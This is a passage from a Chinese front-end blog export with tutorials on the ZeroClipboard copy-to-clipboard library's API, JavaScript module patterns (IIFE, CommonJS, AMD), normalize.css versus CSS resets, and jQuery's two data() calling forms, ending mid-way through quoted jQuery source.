    <content type="text"><![CDATA[&emsp;&emsp;有些时候，我们希望让用户在网页上完成某个操作就能自动将指定的内容复制到用户计算机的剪贴板中。但是出于安全原因，大多数现代浏览器都未提供通用的剪贴板复制接口(或即便有，也默认被禁用)。只有IE浏览器可以通过如下方式来进行复制。1window.clipboardData.setData("Text", "这里是需要复制的文本内容");想要实现跨浏览器的复制功能，我们就可以使用 ZeroClipboard。一、ZeroClipboard 及其原理介绍&emsp;&emsp;ZeroClipboard 是国外大神开发的一个用于剪贴板复制的 JS 插件，它是基于 Flash 来实现跨浏览器的复制功能的。当我们使用 ZeroClipboard 的时候，它会悄悄隐藏一个小小的 Flash 影片(swf)，不会对我们的用户界面造成影响。我们只需要借助它实现复制功能就行了。ZeroClipboard 中的 “Zero” 指的就是”不可见，零干扰”。&emsp;&emsp;不过从 Flash 10开始，由于浏览器和Flash的安全限制，要求用户必须在Flash区域上进行真实操作才能操作剪贴板。于是，ZeroClipboard 的作者想到一个办法：它将 Flash 做成透明的，以便于我们放在诸如链接、按钮等需要放置的任何地方。这样，用户界面看起来没有变化，当点击链接或按钮时，实际上点击是却是 Flash，从而实现复制操作。二、ZeroClipboard 快速入门&emsp;&emsp;使用 ZeroClipboard 的方法非常简单，我们只需要在页面中引入它的一个JS文件并稍作配置(最简单只需一行代码)即可(实际上还需要引入一个Flash的swf文件，不过 ZeroClipboard 会自动引入它)。请参考下面的示例代码：注意：这里介绍的是目前最新版 ZeroClipboard 2.1.6 的用法，2.x 版本均可参考，但 1.x 的用法与此并不相同！ZeroClipboard 2.x 原则上不兼容IE 6 ~ IE 8等低版本IE浏览器，如果需要兼容IE 6 ~ IE 8，请使用 1.x 或者 2.0.2 版本(详情可以参考下方评论中的官方链接)，推荐使用 2.0.2 版本。此外，由于 Flash 本地沙箱的安全限制，以下代码如果是在本地HTML文件中被浏览器直接打开，将无法正常工作。123456789&lt;!-- 这里是HTML代码部分 --&gt;&lt;textarea id="content" rows="10" cols="60"&gt;这里是需要复制的内容&lt;/textarea&gt;&lt;input id="copy" type="button" data-clipboard-target="content" value="复制"&gt;&lt;!-- 这里是JS代码部分 --&gt;&lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/zeroclipboard/2.1.6/ZeroClipboard.min.js" &gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;// 将【复制】按钮充当复制数据的元素载体var clip = new ZeroClipboard( document.getElementById("copy") );&lt;/script&gt;&emsp;&emsp;以上就是引入并使用 ZeroClipboard 的最简代码。我们为【复制】按钮指定了data-clipboard-target属性，其值为将被复制数据的元素id。此时，我们点击【复制】按钮就可以复制id为content的textarea中的文本数据。三、ZeroClipboard 重要事项1、关于文件引入和本地化使用&emsp;&emsp;上面我们引入的JS文件是 ZeroClipboard 官方提供的 CDN，你可以直接使用。如果你想将其下载到本地服务器上使用，你可以进入官方网站下载最新版本。然后将dist目录下的ZeroClipboard.js(或者压缩版的ZeroClipboard.min.js)和ZeroClipboard.swf这两个文件上传到自己的服务器即可。&emsp;&emsp;请确保它们被放在同一目录下，以便于 ZeroClipboard.js 自动加载 ZeroClipboard.swf 文件。否则你需要在使用前额外配置swf文件的路径。12// 在 new ZeroClipboard()之前，需要先配置 ZeroClipboard.swf 文件的路径ZeroClipboard.config( &#123; swfPath: 'http://YOURSERVER/path/ZeroClipboard.swf' &#125; );2、多个复制载体&emsp;&emsp;如果你希望在页面中有多个按钮、链接等元素充当复制数据的载体，你可以以数组(或类数组)形式传入多个元素。以下几种方式都是可以的：12345678910// 方式一 (生成多个ZeroClipboard对象，适合不同载体复制不同来源的数据)var clip = new ZeroClipboard( document.getElementById("copy") );var clip2 = new ZeroClipboard( document.getElementById("copy2") );// 方式二 (生成一个ZeroClipboard对象，适合不同载体复制相同来源的数据)var doms = [ document.getElementById("copy"), document.getElementById("copy2") ];// var doms = document.getElementsByName("copy"); // 通过ByName或ByTagName获取多个元素也是可以的// var doms = $(".copy"); // 通过jQuery对象也是可以的// 只要是通过length属性访问元素个数、通过数字索引来访问DOM元素的对象都是可以的var clip = new ZeroClipboard( doms );3、更改复制载体&emsp;&emsp;如果之前你使用【按钮1】来充当复制载体，现在你想添加【按钮2】来充当复制载体。你可以调用 ZeroClipboard 实例的clip()方法：123var clip = new ZeroClipboard( document.getElementById("copy") );// 添加id为copy2的元素作为复制载体，原来id为copy的元素依然可用clip.clip( document.getElementById("copy2") /* 也可以数组形式传入多个 */ );如果你想要卸载指定的复制载体，你可以使用unclip()方法。12345// 取消id为copy2的元素上注册的复制功能clip.unclip( document.getElementById("copy2") /* 也可以数组形式传入多个 */ );// 不指定任何参数，则取消该对象之前在所有元素上注册的复制功能clip.clip();如果指定了data-clipboard-target属性，ZeroClipboard 将依次尝试通过该元素的value、textContent、innerText属性来获取文本数据(依次判断是否有上述属性，并以最靠前的属性为准)。&emsp;当然，ZeroClipboard 也并非只能通过其他元素才能获得用于复制的文本数据，我们还可以给复制载体自身的data-clipboard-text属性来设置用于复制的文本数据，之后你还可以通过设置该属性值(setAttribute())来更改需要复制的文本内容。1&lt;input id="copy" type="button" data-clipboard-text="这里是用于复制的内容，CodePlayer" value="复制"&gt;&emsp;&emsp;此外，我们甚至无需通过元素节点的属性来设置用于复制的文本数据，我们可以直接使用 ZeroClipboard 对象的setText()方法来设置文本数据。注意，该方法设置的数据是一次性的，使用该方法设置复制数据后，只在下一次复制操作时生效。之后即使你点击复制按钮也不再执行复制，除非你再次调用setText()方法(你可以绑定复制(“copy”)事件来调用该方法，从而实现每次复制操作都设置数据，下面我们会讲到)。1clip.setText("设置用于复制的文本内容");数据来源的优先级问题：如果我们同时为复制载体设置了data-clipboard-text、data-clipboard-target属性，并调用了setText()方法，那么 ZeroClipboard 复制数据的优先级是：setText() &gt; data-clipboard-target &gt; data-clipboard-text。&emsp;&emsp;如果前者没有文本数据(没有调用、 没有属性或者数据为空字符串)，则以下一个优先级为准，如果都没有文本数据，则不复制。举例来说，如果同时设置上述三者。第一次复制：先取setText()设置的数据，如果为空字符串，则取data-clipboard-target对应元素的数据；如果它也为空字符串，则取data-clipboard-text属性的文本数据；如果它也为空字符串，则不复制。注意，由于setText()设置的数据是一次性的，下一次复制将以data-clipboard-target属性为准(除非再次调用setText()方法)。4、数据类型&emsp;&emsp;众所周知，剪贴板中的数据是有类型的，每一种类型都可以有自己的数据。我们复制的数据可以有多种类型，当我们粘贴的时候，会粘贴当前程序可接受类型的数据。&emsp;&emsp;ZeroClipboard也支持设置多种类型的剪贴板数据。它为我们提供了setText()、setHtml、setRichText()方法分别用于设置纯文本数据、HTML内容、富文本内容。1234// 可同时设置，粘贴时根据接收程序的不同，而粘贴出不同的内容clip.setText("CodePlayer");clip.setHtml("**CodePlayer**");clip.setRichText("&#123;\\rtf1\\ansi\n&#123;\\b CodePlayer&#125;&#125;");此外，ZeroClipboard还提供了一个通用的设置方法setData()，用于设置各种类型的数据。1234// 可同时设置，粘贴时根据接收程序的不同，而粘贴出不同的内容clip.setData("text/plain", "CodePlayer");clip.seData("text/html", "**CodePlayer**");clip.setData("application/rtf", "&#123;\\rtf1\\ansi\n&#123;\\b CodePlayer&#125;&#125;");5、事件处理&emsp;&emsp;ZeroClipboard 还为我们提供了事件支持，以便于处理ZeroClipboard触发的各种事件。ZeroClipboard支持的事件有”ready”、 “beforecopy”、 “copy”、 “aftercopy”、 “destroy”、 “error”。我们可以通过on()方法来注册事件处理函数。1234567// 当Flash SWF文件加载完成并准备就绪时触发ready事件clip.on("ready", function()&#123; alert("加载完成!"); &#125;);// 当触发copy事件时，设置用于复制的文本数据clip.on("copy", function(e)&#123; e.clipboardData.setData("text/plain", "这里是用于复制的纯文本数据")&#125;);此外，off()方法用来取消注册的事件处理函数，emit()方法用来手动触发事件。其用法与jQuery的on()、 off()、 trigger()方法非常相似。&emsp;&emsp;此外，如果你有多个ZeroClipboard对象，你想为它们都注册事件处理函数。你可以使用全局对象ZeroClipboard的静态方法ZeroClipboard.on()、 ZeroClipboard.off()、ZeroClipboard.emit()来全局性地设置事件。全局事件将对每个对象都生效。四、ZeroClipboard 全局对象的属性和方法&emsp;&emsp;以下没有标注返回值类型的方法，均表示该方法没有返回值(即undefined)。versionString类型返回当前使用的 ZeroClipboard 的版本号，例如 “2.1.6”。config(...)任意类型设置或返回 ZeroClipboard 的配置选项。具体的配置选项请参见这里。1234567891011// 用法一var config = ZeroClipboard.config(); // 获取对象形式的所有配置选项(副本)// 用法二var swfPath = ZeroClipboard.config("swfPath"); // 获取某个具体的配置选项// 用法三var config = ZeroClipboard.config( &#123; forceHandCursor: true , title: "点击复制"&#125; ); // 以对象形式设置配置选项，并同时返回所有配置选项的新对象(副本)。// 返回的包含所有配置选项的对象都是副本，对其进行操作不会影响ZeroClipboard中的配置选项create()创建 Flash bridge SWF 对象。注意：该方法应该被认为是私有的，不建议用户直接访问。destroy()触发destroy事件，删除所有事件处理器，并销毁Flash bridge。setData(…)设置用于复制的数据，可以设置多种格式(MIME类型)的数据，如果接收粘贴的程序支持对应的MIME类型，就会在粘贴时粘贴对应类型的数据。123456// 其用法如下：其中type表示MIME类型，data表示用于复制的数据ZeroClipboard.setData(type, data);// 例如：ZeroClipboard.setData("text/plain", "用于&lt;复制&gt;的文本数据");ZeroClipboard.setData("text/html", "用于&lt;复制&gt;的文本数据");getData(...)String/Object类型，获取用于复制的数据。1234// 用法一var text = ZeroClipboard.getData("text/html"); //获取用于复制的"text/html"类型的数据// 用法二var dataObj = ZeroClipboard.getData(); //获取用于复制的所有类型的数据，并以对象形式返回(副本)clearData(…)清空剪贴板中的数据。1234// 用法一ZeroClipboard.clearData(); // 清空剪贴板中所有类型的数据// 用法二ZeroClipboard.clearData("text/plain"); // 清空剪贴板中"text/plain"类型的数据focus(…) &amp; activate(…)focus()和activate()方法是相同的。用于通过移动Flash SWF 对象到指定的元素上来暂时聚焦/“激活”该元素。激活后，点击该元素可以进行一次复制操作，但仅有一次，之后Flash SWF 对象将从该元素上移除。activate()是focus()方法的别名，请优先使用focus()方法，activate()主要用于向后兼容。12// 激活该元素ZeroClipboard.focus( document.getElementById("d_clip_button") );blur() &amp;&amp; deactivate()与focus()和activate()方法相对，用于让当前”激活”的元素失去焦点(取消”激活”)。deactivate()是blur()的别名。activeElement()Element类型返回当前被激活的元素，如果没有则返回null。123var btn = document.getElementById("d_clip_button");ZeroClipboard.focus( btn );var activeEl = ZeroClipboard.activeElement(); // activeEl === btnstate()Object类型状态检测方法，用于检测浏览器、Flash 和 ZeroClipboard 的状态。其内容大致如下：123456789101112131415161718192021222324var state = ZeroClipboard.state();/*state = &#123; browser : &#123; appName: "Netscape" platform: "Win32" userAgent: "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" &#125;, flash : &#123; deactivated: false disabled: false outdated: false overdue: false pluginType: "pepper" ready: true unavailable: false version: "12.0.0" &#125;, zeroclipboard : &#123; config: Object // 包含所有配置选项的对象副本 version: "2.1.6" &#125;&#125;*/isFlashUnavailable()Boolean类型,检测Flash是否明确不可用(包括禁用、过时、不可用、无效等)。注意：该方法应该被看作私有的，一般无需用户去检测。on(…)为 ZeroClipboard 的全局事件绑定事件处理函数。支持的事件有”ready”、 “beforecopy”、 “copy”、 “aftercopy”、 “destroy”、 “error”，详情参见下面。123456789101112131415161718192021var listenerFn = function(e) &#123; var ZeroClipboard = this; /* ... */ &#125;;// 为ready事件绑定处理函数，函数内部的this指向全局对象ZeroClipboardZeroClipboard.on("ready", listenerFn);var listenerObj = &#123; handleEvent: function(e) &#123; var listenerObj = this; /* ... */ &#125;&#125;;// 为error事件绑定包含处理函数在内的对象，对象属性名称必须是handleEvent，否则无效。// 处理函数内部的this指向该函数所在对象ZeroClipboard.on("error", listenerObj);// 同时为多个事件绑定相同的处理函数ZeroClipboard.on("ready error", function(e) &#123; /* ... */ &#125;);// 以对象形式同时为多个事件绑定不同的处理函数ZeroClipboard.on(&#123; "ready": function(e) &#123; /* ... */ &#125;, "error": function(e) &#123; /* ... */ &#125;&#125;);// 同一个事件都可以多次调用，从而绑定多个处理函数off(…)解除之前为 ZeroClipboard 绑定的全局事件处理函数。12345678910111213141516171819// 解除ready事件上绑定的listenerFn函数ZeroClipboard.off("ready", listenerFn);// 解除ready事件上绑定的listenerObj对象ZeroClipboard.off("error", listenerObj);// 解除多个事件上绑定的同一listenerFn函数ZeroClipboard.off("ready error", listenerFn);// 同时解除多个事件上绑定的不同函数ZeroClipboard.off(&#123; "ready": readyListenerFn, "error": errorListenerFn&#125;);// 解除ready事件上绑定的所有事件处理函数或对象ZeroClipboard.off("ready");// 解除所有事件的所有绑定ZeroClipboard.off();emit(…)手动触发 ZeroClipboard 的全局事件，会触发该事件上注册的所有事件处理函数。12345678910111213// 触发ready事件ZeroClipboard.emit("ready");// 触发error事件// 这里的name属性是 ZeroClipboard 内部定义的错误类型名称，表示Flash被禁用或未安装。此外还有flash-outdated(版本过低)、 flash-unavailable(无法与JS交互)、 flash-deactivated(未激活)、 flash-overdue(加载Flash SWF超时)。ZeroClipboard.emit(&#123; type: "error", name: "flash-disabled"&#125;);// 只有触发copy事件时，会返回被复制的数据// 由于Flash 10+的安全限制因素，将无法通过代码触发beforecopy、copy、aftercopy等事件var copyData = ZeroClipboard.emit("copy");handlers(…)Array/Object类型,返回 ZeroClipboard 中指定全局事件绑定的事件处理函数或对象的副本。12345// 以数组形式返回ready事件的所有事件处理函数或对象var listeners = ZeroClipboard.handlers("ready");// 以对象形式返回所有事件的所有事件处理函数或对象var listenersObj = ZeroClipboard.handlers();事件处理及其属性细节ready 事件&emsp;&emsp;当Flash SWF文件加载完成并准备就绪时触发ready事件。请注意，你必须在 ZeroClipboard.create()方法被自动调用前设置大多数配置选项，否则你无法在之后更改这些选项。123456789101112ZeroClipboard.on("ready", function(e) &#123;/*e = &#123; type: "ready", message: "Flash communication is established", target: null, relatedTarget: null, currentTarget: flashSwfObjectRef, version: "11.2.202", timeStamp: Date.now()&#125;;*/beforecopy 事件&emsp;&emsp;在点击时，Flash对象会触发 beforecopy 事件。这是一个同步事件，只有你指定的处理操作完成后，才会触发copy事件。12345678910ZeroClipboard.on("beforecopy", function(e) &#123;/*e = &#123; type: "beforecopy", target: currentlyActivatedElementOrNull, relatedTarget: dataClipboardElementTargetOfCurrentlyActivatedElementOrNull, currentTarget: flashSwfObjectRef, timeStamp: Date.now()&#125;;*/copy 事件&emsp;&emsp;当点击时，Flash 对象会触发copy事件(在beforecopy之后触发)。你可以通过事件对象e.clipboardData.setData()方法来设置用于复制的数据。123456789101112131415ZeroClipboard.on("copy", function(e) &#123;/*e = &#123; type: "copy", target: currentlyActivatedElementOrNull, relatedTarget: dataClipboardElementTargetOfCurrentlyActivatedElementOrNull, currentTarget: flashSwfObjectRef, timeStamp: Date.now(), clipboardData: &#123; setData: ZeroClipboard.setData, clearData: ZeroClipboard.clearData &#125;&#125;;*/&#125;);aftercopy 事件&emsp;&emsp;当数据被复制到剪贴板后，触发该事件。123456789101112131415161718192021ZeroClipboard.on("aftercopy", function(e) &#123;/* e = &#123; type: "aftercopy", target: currentlyActivatedElementOrNull, relatedTarget: dataClipboardElementTargetOfCurrentlyActivatedElementOrNull, currentTarget: flashSwfObjectRef, timeStamp: Date.now(), success: &#123; "text/plain": true, "text/html": true, "application/rtf": false &#125;, data: &#123; "text/plain": "Blah", "text/html": "**Blah**", "application/rtf": "&#123;\\rtf1\\ansi\n&#123;\\b Blah&#125;&#125;" &#125; &#125;;*/&#125;);destroy 事件&emsp;&emsp;当ZeroClipboard.destroy()被调用时触发该事件。ZeroClipboard 会确保该事件的处理函数执行完后才完成销毁操作。123456789101112131415161718192021ZeroClipboard.on("destroy", function(e) &#123;/* e = &#123; type: "destroy", target: null, relatedTarget: null, currentTarget: flashSwfObjectRef, timeStamp: Date.now(), success: &#123; "text/plain": true, "text/html": true, "application/rtf": false &#125;, data: &#123; "text/plain": "Blah", "text/html": "**Blah**", "application/rtf": "&#123;\\rtf1\\ansi\n&#123;\\b Blah&#125;&#125;" &#125; &#125;;*/&#125;);error 事件&emsp;&emsp;当满足一系列条件时触发该事件，一般是出现错误时触发该事件。12345678910111213141516// 由于错误有多种，因此事件对象的属性值和个数也不固定，其他错误类型多一个version属性ZeroClipboard.on("error", function(e) &#123;/* e = &#123; type: "error", name: "flash-disabled", messsage: "Flash is disabled or not installed", target: null, relatedTarget: null, currentTarget: flashSwfObjectRef, timeStamp: Date.now(), minimumVersion: "11.0.0"// ,version: "10.3.183" // 其他错误类型具有该属性，表示当前Flash的版本 &#125;;*/&#125;);五、ZeroClipboard的配置选项&emsp;&emsp;以下是 ZeroClipboard 的所有配置选项，所有的选项都具有默认值。你可以调用`ZeroClipboard.config()来设置其中的一个或多个配置选项。如果特别说明，以下每个属性的值均表示该属性的默认值。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061var globalConfig = &#123; // 指定SWF文件的URL，相对于当前页面。 // 其默认值指向与ZeroClipboard JS 文件同目录下的"ZeroClipboard.swf"文件 swfPath: _swfPath, // SWF入内的脚本策略: 用于指定SWF应该信任的页面域名 // (单个字符串，字符串数组) // 默认为当前域名 trustedDomains: window.location.host ? [window.location.host] : [], // 是否阻止SWF文件缓存，默认为true // 此时，将在SWF请求上添加一个"noCache"的查询参数后缀来阻止访问缓存内容 cacheBust: true, // 启用功能花哨的"桌面"剪贴板，甚至在Linux上，它是众所周知的让人讨厌 forceEnhancedClipboard: false, // 指定等待加载Flash SWF文件的毫秒数，超过该时间就假定Flash在用户浏览器上是未激活的 // 如果你不在意加载花费的时间，你可以将其设为null flashLoadTimeout: 30000, // 将其设为false，将允许用户调用ZeroClipboard.focus(...)来处理 // 而不是依赖于每个DOM元素的mouseover处理程序 autoActivate: true, // 当Flash对象接收处理后，是否在JS中冒泡Flash模拟的对应事件。 // 例如，你点击进行复制之后，是否让Flash模拟一个click事件，以便于该元素去冒泡触发对应的JS事件 bubbleEvents: true, // 设置放置Flash对象的div的ID属性 // 其值将会经过针对ID属性的HTML4 规范验证. containerId: "global-zeroclipboard-html-bridge", // 设置放置Flash对象的div的CSS类名 containerClass: "global-zeroclipboard-container", // 设置Flash对象的div的ID属性和name属性 // 其值将会经过针对ID属性和name属性的HTML4 规范验证. swfObjectId: "global-zeroclipboard-flash-bridge", // 将鼠标滑过复制载体元素时使用的CSS类名 hoverClass: "zeroclipboard-is-hover", // The class used to indicate that a clipped element is active (is being clicked). activeClass: "zeroclipboard-is-active", // 强制所有复制载体元素使用手形光标("cursor: pointer") // 重要: 该配置的值可以被一个活动的嵌入SWF修改 forceHandCursor: false, // 设置放置Flash对象的div的title属性，鼠标悬停时显示的提示文本 // 重要: 该配置的值可以被一个活动的嵌入SWF修改 title: null, //Flash对象的 z-index CSS属性 // 最大值为(332位): 2147483647. // 重要: 该配置的值可以被一个活动的嵌入SWF修改 zIndex: 999999999&#125;;官方地址：http://zeroclipboard.org/相应版本下载地址：http://www.bootcdn.cn/zeroclipboard/&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>JavaScript复制功能</tag>
        <tag>JavaScript复制粘贴功能</tag>
        <tag>js 复制功能</tag>
        <tag>js复制粘贴功能</tag>
        <tag>ZeroClipboard api</tag>
        <tag>ZeroClipboard.js</tag>
        <tag>ZeroClipboard.js详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript模块化开发详解]]></title>
    <url>%2F2016%2F03%2F21%2Fjavascript%E6%A8%A1%E5%9D%97%E5%8C%96%E5%BC%80%E5%8F%91%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[模块化：每个模块只完成一个独立的功能，然后提供该功能的接口。模块间通过接口访问。模块中的（过程和数据）对于其它模块来说是私有的（不能访问修改）原始人写法：123456function m1()&#123;//...&#125;function m2()&#123;//...&#125;对象封装写法123456789var loveThing = &#123;mylove : "coding",getLove :function() &#123;returnthis.mylove;&#125;,sayLove : function(thing) &#123;console.log(thing);&#125;&#125;console.log(loveThing.getLove());//&gt;&gt;&gt; codingloveThing.sayLove(‘girl’);//&gt;&gt;&gt; girl这种写法已经有点模块的样子了，一下就能看出这几个函数和变量之间的联系。缺点在于所有变量都必须声明为公有，所以都要加this指示作用域以引用这些变量。更危险的是，在对象之外也能轻松更改里面的参数：loveThing.mylove = “sleeping”;console.log(loveThing.getLove());//&gt;&gt;&gt; sleeping立即执行函数外部可以访问my这个接口，但以下代码（过程和数据）对于其它模块来说是私有的以下这种方法返回一个对象，让其他模块去调用1234567891011var loveThing = (function()&#123;var my = &#123;&#125;;var love = "coding";my.getLove = function() &#123;return love;&#125;my.sayLove = function(thing) &#123;console.log(thing);&#125;return my;&#125;)();console.log(loveThing.getLove());//&gt;&gt;&gt;coding loveThing.sayLove(‘reading’);//&gt;&gt;&gt; reading将局部的函数提升到windows下面，可以让其他地方使用。1234567(function()&#123;// private codevar a = function()&#123;&#125;window.a = a;&#125;)();我们试着获取里面的变量：console.log(loveThing.love);//&gt;&gt;&gt; undefined果然，外部根本看不见里面的零件，只能使用提供的接口。这样才能保证私有变量的安全。输入全局变量独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。为了在模块内部调用全局变量，必须显式地将其他变量输入模块。下面除了保证模块的独立性，还使得模块之间的依赖关系变得明显。123var module1 = (function ($,) &#123;//...&#125;)(jQuery,);CommonJS和AMD目前，通行的Javascript模块规范共有两种：CommonJS和AMD。最近在学习node，node.js的模块系统，就是参照CommonJS规范实现的。只使用require()，用得一个爽字例如：var math = require(‘math’);然后，就可以调用模块提供的方法：var math = require(‘math’);math.add(2,3); // 5然而，由于一个重大的局限，使得CommonJS规范不适用于浏览器环境。还是上一节的代码，如果在浏览器中运行，会有一个很大的问题，你能看出来吗？第二行math.add(2,3)，在第一行require(‘math’)之后运行，因此必须等math.js加载完成。也就是说，如果加载时间很长，整个应用就会停在那里等。因此，浏览器端的模块，不能采用”同步加载”（synchronous），只能采用”异步加载”（asynchronous）。这就是AMD规范诞生的背景。AMD是”Asynchronous ModuleDefinition”的缩写，意思就是”异步模块定义”。require.js实现了AMD规范AMD也采用require()语句加载模块，但是不同于CommonJS，它要求两个参数require([module], callback);[module]：数组，要加载的模块；callback：加载成功之后的回调函数。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript模块化</tag>
        <tag>JavaScript模块化开发</tag>
        <tag>js模块化</tag>
        <tag>js模块化开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[normalize.css使用介绍]]></title>
    <url>%2F2016%2F03%2F14%2Fnormalize-css%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[Normalize.css只是一个很小的CSS文件，但它在默认的HTML元素样式上提供了跨浏览器的高度一致性。相比于传统的CSS reset，Normalize.css是一种现代的、为HTML5准备的优质替代方案。Normalize.css现在已经被用于Twitter Bootstrap、HTML5 Boilerplate、GOV.UK、Rdio、CSS Tricks 以及许许多多其他框架、工具和网站上。Normalize.css 项目地址Normalize.css 在GitHub上的源码综述Normalize.css是一种CSS reset的替代方案。经过@necolas和@jon_neal花了几百个小时来努力研究不同浏览器的默认样式的差异，这个项目终于变成了现在这样。我们创造normalize.css有下面这几个目的：保护有用的浏览器默认样式而不是完全去掉它们一般化的样式：为大部分HTML元素提供修复浏览器自身的bug并保证各浏览器的一致性优化CSS可用性：用一些小技巧解释代码：用注释和详细的文档来Normalize.css支持包括手机浏览器在内的超多浏览器，同时对HTML5元素、排版、列表、嵌入的内容、表单和表格都进行了一般化。尽管这个项目基于一般化的原则，但我们还是在合适的地方使用了更实用的默认值。Normalize vs Reset知道Normalize.css和传统Reset的区别是非常有价值的。1. Normalize.css 保护了有价值的默认值Reset通过为几乎所有的元素施加默认样式，强行使得元素有相同的视觉效果。相比之下，Normalize.css保持了许多默认的浏览器样式。这就意味着你不用再为所有公共的排版元素重新设置样式。当一个元素在不同的浏览器中有不同的默认值时，Normalize.css会力求让这些样式保持一致并尽可能与现代标准相符合。2. Normalize.css 修复了浏览器的bug它修复了常见的桌面端和移动端浏览器的bug。这往往超出了Reset所能做到的范畴。关于这一点，Normalize.css修复的问题包含了HTML5元素的显示设置、预格式化文字的font-size问题、在IE9中SVG的溢出、许多出现在各浏览器和操作系统中的与表单相关的bug。可以看以下这个例子，看看对于HTML5中新出现的input类型search，Normalize.css是如何保证跨浏览器的一致性的。1234567891011121314151617181920/** * 1\. Addresses appearance set to searchfield in S5, Chrome * 2\. Addresses box-sizing set to border-box in S5, Chrome (include -moz to future-proof) */input[type="search"] &#123; -webkit-appearance: textfield; /* 1 */ -moz-box-sizing: content-box; -webkit-box-sizing: content-box; /* 2 */ box-sizing: content-box;&#125;/** * Removes inner padding and search cancel button in S5, Chrome on OS X */input[type="search"]::-webkit-search-decoration,input[type="search"]::-webkit-search-cancel-button &#123; -webkit-appearance: none;&#125;3. Normalize.css 不会让你的调试工具变的杂乱使用Reset最让人困扰的地方莫过于在浏览器调试工具中大段大段的继承链，如下图所示。在Normalize.css中就不会有这样的问题，因为在我们的准则中对多选择器的使用时非常谨慎的，我们仅会有目的地对目标元素设置样式。4. Normalize.css 是模块化的这个项目已经被拆分为多个相关却又独立的部分，这使得你能够很容易也很清楚地知道哪些元素被设置了特定的值。因此这能让你自己选择性地移除掉某些永远不会用到部分（比如表单的一般化）。5. Normalize.css 拥有详细的文档Normalize.css的代码基于详细而全面的跨浏览器研究与测试。这个文件中拥有详细的代码说明并在Github Wiki中有进一步的说明。这意味着你可以找到每一行代码具体完成了什么工作、为什么要写这句代码、浏览器之间的差异，并且你可以更容易地进行自己的测试。这个项目的目标是帮助人们了解浏览器默认是如何渲染元素的，同时也让人们很容易地明白如何改进浏览器渲染。如何使用 normalize.css首先，安装或从Github下载Normalize.css，接下来有两种主要途径去使用它。策略一：将normalize.css作为你自己项目的基础CSS，自定义样式值以满足设计师的需求。策略二：引入normalize.css源码并在此基础上构建，在必要的时候用你自己写的CSS覆盖默认值。结语无论从适用范畴还是实施上，Normalize.css与Reset都有极大的不同。尝试一下这两种方法并看看到底哪种更适合你的开发偏好是非常值得的。这个项目在Github上以开源的形式开发。任何人都能够提交问题报告或者提交补丁。整个项目发展的过程对所有人都是可见的，而每一次改动的原因也都写在commit信息中，这些都是有迹可循的。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>normalize.css使用介绍</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jquery-data的两种使用方式的对比]]></title>
    <url>%2F2016%2F03%2F12%2Fjquery-data%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[曾经发表过的关于data的博文：使用 data-* 属性来嵌入自定义数据，想对data定义数据有深入了解的小伙伴请转至那篇博文，今天将再次提及data-*属性，以及在使用Jquery时如果要再DOM上储存数据（jquery的data方法）：123456//最好不要使用下面这种形式var elem = $('#elem');elem.data(key,value);//尽可能用：var elem = $('#elem');$.data(elem[0],key,value);解释原因为：后一种写法要比前一种写法，快了将近10倍。因为elem.data()方法是定义在jQuery函数的prototype对象上面的，而$.data()方法是定义jQuery函数上面的，调用的时候不从复杂的jQuery对象上调用，所以速度快得多。乍一看可能有点懵逼，去W3School上找这两种方法，可以看到解释概念不太一样，点进去后却发现两个方法的内容几乎完全一样，顿时有种被骗的感觉：没关系，今天我们就是要详细说说这两种形式的区别。如果看过Jquery源码也许会发现对于jquery的extend有两种使用方式，第一种：jQuery.extend();&gt;第二种：jQuery.fn.extend();其实往简单的说，就是$.extend()和$.fn.extend()用法和区别。我们自己写jquery插件时候应该常用到这两种函数，乍一看很像，其实两个函数差别还是很大，下面具体讲讲有什么区别1、$.extend()该方法用于扩展jQuery类，它的方法是全局的，直接用jquery类便可以引用：123456$.extend(&#123;getName:function(name)&#123;return name;&#125;&#125;);$.getName("侠名风");通常我们把这类函数称作为工具函数，它们不直接操作DOM元素，而是操作Javascript的非元素对象，或者执行其他非对象的特定操作。2、$.fn.extend()该方法则是用来扩展jQuery的实例方法，也就是说jQuery类的实例对象可以调用此函数（你也可以理解为操作dom来实现），代码如下:1234567891011121314151617181920&lt;html&gt;&lt;head&gt;&lt;script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;$(document).ready(function()&#123;$.fn.extend(&#123;sayHello:function()&#123;alert("你好，侠名风！");&#125;&#125;)$("#btn").click(function()&#123;$(this).sayHello()&#125;);&#125;)&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="btn"&gt;点我&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;该例子通过$.fn.extend()方法为jQuery扩展一个实例方法，那么就必须要用对象实例来调用此方法，$(“#btn”)就是一个对象实例，这样它就可以调用添加的方法。有的人会问了，你不是在讲data吗？干嘛扯出来extend？别急，那么回到我们最初的问题，data这两种方式跟extend有何区别？打开jquery源码，我这里以jquery最新的2.2.1版本作为例子讲解。1、elem.data(key,value);查看jQuery源码关于data此形式定义的方法：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364jQuery.fn.extend( &#123; data: function( key, value ) &#123; var i, name, data, elem = this[ 0 ], attrs = elem &amp;amp;&amp;amp; elem.attributes; // 如果你在标签定义data-xxxx属性，此方法会获取到所有的value并返回 if ( key === undefined ) &#123; if ( this.length ) &#123; data = dataUser.get( elem ); if ( elem.nodeType === 1 &amp;amp;&amp;amp; !dataPriv.get( elem, "hasDataAttrs" ) ) &#123; i = 